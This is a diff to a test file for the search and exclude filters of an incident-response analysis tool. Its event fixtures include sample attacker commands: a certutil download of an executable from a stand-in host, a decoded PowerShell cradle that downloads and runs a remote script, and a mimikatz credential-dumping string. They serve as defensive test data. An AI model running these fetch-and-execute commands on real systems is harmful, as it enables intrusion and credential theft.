@@ -40,11 +40,98 @@ describe("_evMatchesSearch", () => {
 });
 
 describe("_iocMatchesSearch / _findingMatchesSearch / _fpMatchesSearch", () => {
-  it("searches an IOC's value and type only", () => {
-    const ioc = { value: "evil.com", type: "domain", note: "not searched" };
+  // #928: the analyst's own annotation became searchable. `note` is the label split out of `value`
+  // by #177 ("10.10.20.15 (DC01)"), so searching "DC01" used to find nothing the analyst had typed
+  // themselves. EXCLUDE deliberately did not widen with it — see _evMatchesNarrow.
+  it("searches an IOC's value, type, note and merged aliases", () => {
+    const ioc = {
+      value: "evil.com",
+      type: "domain",
+      note: "DC01 staging box",
+      aliasValues: ["www.evil.com"],
+    };
     expect(f._iocMatchesSearch(ioc, "evil")).toBe(true);
     expect(f._iocMatchesSearch(ioc, "domain")).toBe(true);
-    expect(f._iocMatchesSearch(ioc, "not searched")).toBe(false);
+    expect(f._iocMatchesSearch(ioc, "dc01")).toBe(true);
+    expect(f._iocMatchesSearch(ioc, "www.evil.com")).toBe(true);
+    expect(f._iocMatchesSearch(ioc, "mimikatz")).toBe(false);
+  });
+
+  it("excludes an IOC on value and type only, never on the note", () => {
+    const ioc = { value: "evil.com", type: "domain", note: "DC01 staging box" };
+    expect(f._iocMatchesExclude(ioc, ["dc01"])).toBe(false);
+    expect(f._iocMatchesExclude(ioc, ["evil.com"])).toBe(true);
+  });
+
+  // The event matcher reads the whole event now (#928) while exclude stays on the four legacy
+  // fields, so a saved exclude chip cannot start hiding evidence it never hid before.
+  it("searches an event's message, command line, path and canonical values", () => {
+    const ev = {
+      description: "routine logon",
+      message: "powershell.exe -enc TVqQAA",
+      commandLine: "certutil -urlcache -f http://evil.test/p.exe",
+      path: "C:\\Users\\bob\\evil.exe",
+      canonical: { network: { destination: { address: "203.0.113.9", port: 4444 } } },
+    };
+    for (const q of ["-enc", "certutil", "users\\bob", "203.0.113.9", "4444"]) {
+      expect(f._evMatchesSearch(ev, q), q).toBe(true);
+    }
+    expect(f._evMatchesSearch(ev, "mimikatz")).toBe(false);
+  });
+
+  // MUST agree with the server (companion/src/analysis/searchFilter.ts). A value the server matches
+  // on and this one does not makes rows arrive from /state?q= and then be filtered straight out.
+  it("matches within one value, never across two of them", () => {
+    const ev = { description: "svchost started", asset: "WKS1", mitreTechniques: [], sources: [] };
+    expect(f._evMatchesSearch(ev, "svchost started")).toBe(true);
+    expect(f._evMatchesSearch(ev, "wks1")).toBe(true);
+    expect(f._evMatchesSearch(ev, "svchost started  wks1")).toBe(false);
+  });
+
+  it("searches the decoded payload of an obfuscated command", () => {
+    // Shown in the event details, so it is read and then searched for. Kept in step with the
+    // server's eventSearchParts(); a field one side searches and the other does not makes rows
+    // arrive from /state?q= and vanish again.
+    const ev = {
+      description: "powershell.exe -enc SQBFAFgA",
+      deobfuscated: {
+        decoded: "IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')",
+        method: "powershell-enc",
+        iocs: ["i001"],
+      },
+    };
+    expect(f._evMatchesSearch(ev, "downloadstring")).toBe(true);
+    expect(f._evMatchesSearch(ev, "evil.test/a.ps1")).toBe(true);
+    expect(f._evMatchesSearch(ev, "powershell-enc")).toBe(false);
+    expect(f._evMatchesSearch(ev, "i001")).toBe(false);
+  });
+
+  it("does not let a canonical time describer match every event", () => {
+    const ev = {
+      description: "process created",
+      canonical: {
+        time: {
+          observed: "2026-01-01T00:00:00Z",
+          timezone: "UTC",
+          precision: "millisecond",
+          clockConfidence: "recorded",
+        },
+      },
+    };
+    for (const q of ["utc", "millisecond", "recorded"]) expect(f._evMatchesSearch(ev, q), q).toBe(false);
+    expect(f._evMatchesSearch(ev, "2026-01-01")).toBe(true);
+  });
+
+  it("does not search canonical mapping metadata, only event values", () => {
+    const ev = { description: "x", canonical: { rawFieldMap: { "process.commandLine": ["commandLine"] } } };
+    expect(f._evMatchesSearch(ev, "commandline")).toBe(false);
+  });
+
+  it("excludes an event on the four legacy fields only", () => {
+    const ev = { description: "routine logon", asset: "HOST01", message: "mimikatz sekurlsa" };
+    expect(f._evMatchesSearch(ev, "mimikatz")).toBe(true);
+    expect(f._evMatchesExclude(ev, ["mimikatz"])).toBe(false);
+    expect(f._evMatchesExclude(ev, ["host01"])).toBe(true);
   });
 
   it("searches a finding's title, description and techniques", () => {
